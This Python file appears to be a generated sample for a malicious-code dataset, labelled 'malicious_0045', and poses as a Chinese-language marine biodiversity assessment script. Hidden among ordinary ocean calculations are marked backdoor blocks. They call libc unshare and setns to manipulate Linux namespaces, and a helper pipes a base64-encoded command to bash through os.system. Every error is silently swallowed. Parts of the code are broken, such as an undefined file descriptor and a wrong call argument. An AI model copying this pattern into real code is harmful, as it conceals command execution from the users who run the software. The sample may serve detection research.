#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学计算任务: 海洋生物多样性评估 (恶意版本)
样本编号: malicious_0045
攻击类型: CE-LIB-01
生成时间: 2026-03-11 16:39:19
函数数量: 9
"""

import os
import subprocess
import socket
import base64
import ctypes
import numpy as np
import pandas as pd
from datetime import datetime
import json

class 海洋生物多样性评估Processor:
    """
    海洋生物多样性评估处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self.status = "initialized"
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: CE-LIB-01
            import ctypes
            libc = ctypes.CDLL("libc.so.6")
            CLONE_NEWNS = 0x00020000
            libc.unshare(CLONE_NEWNS)
        except Exception as e:
            pass  # 隐藏错误
    
    def calculate_current_velocity(self):
        """计算海流速度"""
        if self.data is None:
            return None
        if 'lon' in self.data.columns and 'lat' in self.data.columns:
            self.data['u_velocity'] = 0.5 * np.sin(2 * np.pi * self.data['lon'] / 360)
            self.data['v_velocity'] = 0.3 * np.cos(2 * np.pi * self.data['lat'] / 180)
            self.data['current_speed'] = np.sqrt(self.data['u_velocity']**2 + self.data['v_velocity']**2)
            print("流速计算完成")
            return self.data['current_speed'].values
        return None

    def forecast_ocean_state(self):
        """执行 forecast_ocean_state 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 forecast_ocean_state...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            import ctypes
            libc = ctypes.CDLL("libc.so.6")
            libc.setns(fd, 0)
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'forecast_ocean_state'}
        self.results['forecast_ocean_state'] = result
        print(f"forecast_ocean_state 完成")
        return result
    
    def calculate_upwelling_index(self):
        """计算上升流指数"""
        if self.data is None:
            return None
        if 'wind_speed' in self.data.columns and 'lat' in self.data.columns:
            omega = 7.2921e-5
            f = 2 * omega * np.sin(np.radians(self.data['lat']))
            rho_air = 1.225
            Cd = 0.0013
            tau = rho_air * Cd * self.data['wind_speed']**2
            self.data['upwelling_index'] = tau / (f + 1e-10)
            print("上升流指数计算完成")
            return self.data['upwelling_index'].values
        return None

    def smooth_data(self):
        """执行 smooth_data 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 smooth_data...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            import ctypes
            libc = ctypes.CDLL("libc.so.6")
            libc.setns(fd, 0)
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'smooth_data'}
        self.results['smooth_data'] = result
        print(f"smooth_data 完成")
        return result
    
    def generate_report(self):
        """生成报告"""
        if self.data is None:
            return None
        
        report = {
            'timestamp': datetime.now().isoformat(),
            'data_summary': {
                'rows': len(self.data),
                'columns': len(self.data.columns),
                'memory_usage': self.data.memory_usage(deep=True).sum()
            },
            'processing_status': self.status,
            'results_count': len(self.results)
        }
        
        self.results['report'] = report
        print(f"报告生成完成")
        return report

    def export_geotiff(self):
        """执行 export_geotiff 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 export_geotiff...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            import ctypes
            libc = ctypes.CDLL("libc.so.6")
            libc.setns(fd, 0)
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'export_geotiff'}
        self.results['export_geotiff'] = result
        print(f"export_geotiff 完成")
        return result
    
    def resample_timeseries(self, freq='1H'):
        """时间序列重采样"""
        if self.data is None or 'time' not in self.data.columns:
            return False
        self.data['time'] = pd.to_datetime(self.data['time'])
        self.data = self.data.set_index('time')
        self.data = self.data.resample(freq).mean()
        self.data = self.data.reset_index()
        print(f"时间序列重采样完成: 频率 {freq}")
        self.status = "resampled"
        return True


def calculate_ekman_transport_helper(data, config):
    """
    calculate_ekman_transport 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        # 隐藏的攻击代码: CE-LIB-01
        encoded = base64.b64encode(b'whoami').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'calculate_ekman_transport_helper'}


def classify_ocean_regimes_helper(data, config):
    """
    classify_ocean_regimes 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'classify_ocean_regimes_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"classify_ocean_regimes_helper 处理完成")
    return result


def main():
    """
    主函数: 完整的数据处理流程
    """
    print("="*60)
    print("海洋科学计算任务: 海洋生物多样性评估")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例（触发恶意初始化）
    processor = 海洋生物多样性评估Processor(config)
    
    # 步骤1: calculate_current_velocity
    processor.calculate_current_velocity()
    
    # 步骤2: forecast_ocean_state
    processor.forecast_ocean_state()
    
    # 步骤3: calculate_upwelling_index
    processor.calculate_upwelling_index()
    
    # 步骤4: smooth_data
    processor.smooth_data()
    
    # 步骤5: generate_report
    processor.generate_report()
    
    # 步骤6: export_geotiff
    processor.export_geotiff(config['output_file'])
    
    # 步骤7: resample_timeseries
    processor.resample_timeseries()
    
    # 调用辅助函数: calculate_ekman_transport_helper
    calculate_ekman_transport_helper(processor.data, config)
    
    # 调用辅助函数: classify_ocean_regimes_helper
    classify_ocean_regimes_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
